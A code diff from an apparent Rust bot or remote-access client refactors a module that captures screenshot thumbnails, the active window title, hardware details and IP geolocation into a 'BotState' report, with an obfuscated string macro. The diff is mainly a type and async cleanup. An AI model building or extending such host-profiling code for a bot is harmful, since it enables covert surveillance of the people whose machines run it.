@@ -12,6 +12,7 @@ use std::io::Cursor;
 use screenshots::Screen;
 use screenshots::image;
 use crate::err;
+use crate::network::basic::get_ip_info;
 
 fn get_active_window() -> String {
     unsafe {
@@ -22,7 +23,7 @@ fn get_active_window() -> String {
         return String::from_utf8_lossy(&title).to_string();
     }
 }
-pub fn get_thumbnail() -> Result<Option<Vec<u8>>> {
+pub fn get_thumbnail() -> Result<Vec<u8>> {
     let primary_screen = Screen::all()
         .context("Failed to get all screens")?
         .into_iter()
@@ -34,10 +35,10 @@ pub fn get_thumbnail() -> Result<Option<Vec<u8>>> {
     let thumbnail = image.resize(256, 144, image::imageops::FilterType::Lanczos3);
     let mut buffer = Cursor::new(Vec::new());
     thumbnail.write_to(&mut buffer, image::ImageFormat::Jpeg)?;
-    Ok(Some(buffer.into_inner()))
+    Ok(buffer.into_inner())
 }
 
-pub async fn get_dynamic_info() -> DynamicInfo {
+pub fn get_dynamic_info() -> DynamicInfo {
     let sys = System::new_with_specifics(
         RefreshKind::nothing()
             .with_cpu(CpuRefreshKind::everything())
@@ -58,12 +59,14 @@ pub async fn generate_bot_state(tag: String) -> BotState {
     std::thread::sleep(sysinfo::MINIMUM_CPU_UPDATE_INTERVAL);
 
     BotState {
-        thumbnail: get_thumbnail().unwrap_or_else(|error| {
-            err!("Error getting thumbnail", error);
-            None
-        }),
+        thumbnail: get_thumbnail()
+            .map(Some)
+            .unwrap_or_else(|error| {
+                err!("Error getting thumbnail", error);
+                None
+            }),
         tag,
-        real_time_info: get_dynamic_info().await,
+        real_time_info: get_dynamic_info(),
         hw_info: HardwareInfo {
             total_ram: sys.total_memory(),
             core_count: sys.physical_core_count(),
@@ -82,11 +85,4 @@ pub async fn generate_bot_state(tag: String) -> BotState {
         },
         ip_info: get_ip_info().await.unwrap_or(IpInfo::default()),
     }
-}
-
-async fn get_ip_info() -> Result<IpInfo> {
-    let res = reqwest::get(s!("http://ip-api.com/json?fields=66791423")).await?;
-    let text = res.text().await?;
-    let ip_info: IpInfo = serde_json::from_str(&text)?;
-    Ok(ip_info)
 }
